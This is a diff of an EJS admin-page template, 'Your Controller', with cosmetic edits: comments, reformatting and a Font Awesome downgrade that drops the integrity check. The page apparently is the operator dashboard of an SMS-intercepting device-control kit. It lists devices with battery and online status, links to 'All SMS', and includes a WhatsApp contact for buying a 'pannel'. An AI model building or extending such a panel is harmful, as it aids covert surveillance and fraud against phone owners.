@@ -4,47 +4,58 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Your Controller</title>
+  
+  <!-- Link to your custom CSS -->
   <link rel="stylesheet" href="/css/phon.css" />
-  <!-- Font Awesome CDN for WhatsApp icon -->
+
+  <!-- Font Awesome 4.7.0 for WhatsApp icon -->
   <link
     rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
-    integrity="sha512-Fo3rlrZj/k7ujTnH/PR5rFQ6z7Xzg2q9XjKj2+Vl5NlaeXJgW6XZ+9Kfa1lLffkj1EZu1VZ9O+VYGXkB8z7cKg=="
-    crossorigin="anonymous"
-    referrerpolicy="no-referrer"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
   />
 </head>
 <body>
   <nav class="header-nav">
+    <!-- Hamburger Menu Icon -->
     <div class="menu-icon">&#9776;</div>
+
+    <!-- Title -->
     <h1 class="title">Admin</h1>
-    <!-- WhatsApp Icon added next to the Admin title -->
+    
+    <!-- WhatsApp Icon Link -->
     <a
       href="https://wa.me/917865067071?text=Hello%20sir%20i%20need%20a%20pannel.%20can%20you%20help%20me"
       target="_blank"
       rel="noopener noreferrer"
       style="margin-left: 10px;"
     >
-      <i class="fab fa-whatsapp fa-2x" style="color:#25D366;"></i>
+      <!-- Font Awesome WhatsApp Icon -->
+      <i class="fa fa-whatsapp fa-2x" style="color:#25D366;"></i>
     </a>
+
+    <!-- Logout Button -->
     <button id="logoutAllButton">
       <img src="/image/logout.png" alt="Logout">
     </button>
   </nav>
   
+  <!-- Sidebar Navigation -->
   <div class="nav-links">
     <a href="/api/admin/settings">Update Number</a>
     <a href="/api/notification/sms">All SMS</a>
     <a href="/api/auth/change-credentials">Password change</a>
   </div>
 
+  <!-- Main Content -->
   <div class="dot">
     <div class="container" id="deviceContainer">
       <% 
+        // Sort users by uniqueid
         const sortedUsers = users.sort((a, b) => {
           return a.uniqueid.toString().localeCompare(b.uniqueid.toString());
         });
-        sortedUsers.forEach((user, index) => { 
+
+        sortedUsers.forEach((user, index) => {
           const hasUserEntry = user.userEntries && user.userEntries.length > 0;
           const userName = hasUserEntry ? user.userEntries[0].name : null;
       %>
@@ -52,19 +63,26 @@
           <div class="device-content">
             <img src="/image/style.webp" alt="User Icon" />
             <div class="device-details">
-              <h2>User <%= index + 1 %>: <%= userName ? userName : user.brand %></h2>
+              <h2>
+                User <%= index + 1 %>:
+                <%= userName ? userName : user.brand %>
+              </h2>
               <p><strong>User Id :</strong> <%= user.uniqueid %></p>
               <p><strong>Battery :</strong> <%= user.batteryLevel %></p>
             </div>
           </div>
-          <div class="device-status <%= user.connectivity === 'Online' ? 'status-online' : 'status-offline' %>">
-            Status - <%= user.connectivity === 'Online' ? 'Online User' : 'Offline User' %>
+          <div
+            class="device-status <%= user.connectivity === 'Online' ? 'status-online' : 'status-offline' %>"
+          >
+            Status -
+            <%= user.connectivity === 'Online' ? 'Online User' : 'Offline User' %>
           </div>
         </div>
       <% }); %>
     </div>
   </div>
 
+  <!-- Socket.io and other scripts -->
   <script src="/socket.io/socket.io.js"></script>
   <script src="/js/script.js"></script>
   <!-- External JS for logout functionality -->
